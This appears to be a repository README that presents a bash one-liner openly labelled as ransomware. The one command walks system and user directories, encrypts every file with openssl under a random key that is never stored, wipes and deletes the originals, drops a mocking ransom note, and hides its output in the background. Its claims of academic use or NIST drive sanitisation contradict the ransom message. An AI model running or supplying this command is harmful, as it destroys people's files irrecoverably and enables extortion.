# Ransomware-Oner-Line
This is a code for ransomware in bash script oner line. !!! PURELY FOR ACADEMICAL PURPOSES !!!  

I am not responsible in any way for the misuse of this script, this is code normally installed in any linux distribution  
that has been bundled in a way to encrypt all data using AES-CBC-256 encryption with openssl.  

This script was developed for the purpose of sanitizing physical storage drives for disposal to NIST-800-88 standard  

With great powers, great responsibilities...  

### Code

```
Ranswom@lock:~$ for i in $(find /home /media /mnt /opt /root /srv /tmp /var -type f); do openssl enc -aes-256-cbc -a -salt -in $i -out $i.cry -k $(echo -n $RANDOM | base64 | sha256sum) && echo '' > $i && rm -rf $i;echo 'All your files has been encrypted ! hehehe 3:)' > $HOME/README.TXT;done >/dev/null 2>&1& 
```
